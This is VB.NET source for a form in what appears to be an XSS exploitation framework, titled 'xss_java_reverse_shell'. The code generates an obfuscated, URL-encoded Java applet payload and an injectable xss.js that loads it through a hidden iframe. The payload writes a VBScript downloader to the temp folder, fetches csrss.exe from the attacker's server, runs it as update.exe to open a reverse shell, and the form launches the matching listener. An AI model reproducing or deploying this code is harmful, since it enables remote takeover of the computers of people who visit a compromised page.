Imports Ionic.Zip

Public Class xss_java_reverse_shell

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim ran = New Random()
        Dim tmp = ran.Next(2900, 2950)
        TextBox6.Enabled = False
        Dim q As String = """"
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\index.html")
        stream.WriteLine("<script>document.write(unescape(" & q & "%0A%3Capplet%20code%3D%22Client.class%22%20archive%3D%22xdrive.jar%22%0A%20height%3D%221%22%20width%3D%221%22%3E%0A%3Cparam%20name%3D%22windows1%22%0A%20value%3D%22cmd.exe%20/c%20echo%20Const%20adTypeBinary%20%3D%201%20%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Const%20adSaveCreateOverWrite%20%3D%202%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Dim%20abc%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Dim%20xyz%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Dim%20rofl%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20abc%20%3D%20%26quot%3BADODB%26quot%3B%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20xyz%20%3D%20%26quot%3B.Stream%26quot%3B%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Set%20rofl%20%3D%20CreateObject%28abc+xyz%29%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20rofl.Type%20%3D%20adTypeBinary%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20rofl.Open%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20rofl.Write%20BinaryGetURL%28Wscript.Arguments%280%29%29%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20rofl.SaveToFile%20Wscript.Arguments%281%29%2C%20adSaveCreateOverWrite%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Function%20BinaryGetURL%28URL%29%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Dim%20lol%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Set%20lol%20%3D%20CreateObject%28%26quot%3BWinHttp.WinHttpRequest.5.1%26quot%3B%29%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vb%0As%20%26amp%3B%20echo%20lol.Open%20%26quot%3BGET%26quot%3B%2C%20URL%2C%20False%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20lol.Send%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20BinaryGetURL%20%3D%20lol.ResponseBody%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20End%20Function%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20Set%20blub%20%3D%20CreateObject%28%26quot%3BWScript.Shell%26quot%3B%29%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20echo%20blub.Run%20%26quot%3B%25temp%25%5Cupdate.exe%20" & TextBox3.Text & "%20" & TextBox6.Text & "%26quot%3B%20%26gt%3B%26gt%3B%20%25temp%25%5Cwinconfig.vbs%20%26amp%3B%20start%20%25temp%25%5Cwinconfig.vbs%20" & q & "));</script>")
        stream.WriteLine("http://" & xss_server.server_ip & "/csrss.exe" & " %temp%\update.exe" & q & "></applet></center></body></html>")
        stream.Close()
        Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js")
        streamx.WriteLine("if (document.getElementById('xenotix_rs" & Str(tmp) & "') == null){ ")
        streamx.WriteLine("var ifm=document.createElement('iframe');")
        streamx.WriteLine("ifm.setAttribute('src','http://" & xss_server.server_ip & "/index.html'); ifm.width=0; ifm.height=0;")
        streamx.WriteLine("document.body.appendChild(ifm);")
        streamx.WriteLine("script = document.createElement('script');script.id = 'xenotix_rs" & Str(tmp) & "'; document.body.appendChild(script); }")
        streamx.Close()
        Button1.Enabled = False
        Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\xdrive.zip")
            unzip.Password = "asd123"
            Dim ee As ZipEntry

            For Each ee In unzip
                ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
            Next
        End Using
    End Sub

    Private Sub Form11_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
       
        Button1.Enabled = False
        IO.File.Delete("xss.js")
        IO.File.Delete("index.html")
        IO.File.Delete("xdrive.jar")
        TextBox3.Text = xss_server.ip.Text
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        On Error Resume Next
        Dim jnk As Integer = Int32.TryParse(TextBox6.Text, jnk)
        If Not Int32.TryParse(TextBox6.Text, jnk) Or TextBox6.Text = "" Or jnk < 1 Or jnk > 65355 Then
            MsgBox("Enter a valid Port Number", vbCritical)
        ElseIf jnk = 3555 Then
            MsgBox("Reserved Port", vbCritical)
        Else
            Dim cmp As String
            cmp = " " & TextBox6.Text
            Process.Start("listener.exe", cmp)
            Button1.Enabled = True
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("index.html")
        IO.File.Delete("xdrive.jar")
        Me.Close()
    End Sub
End Class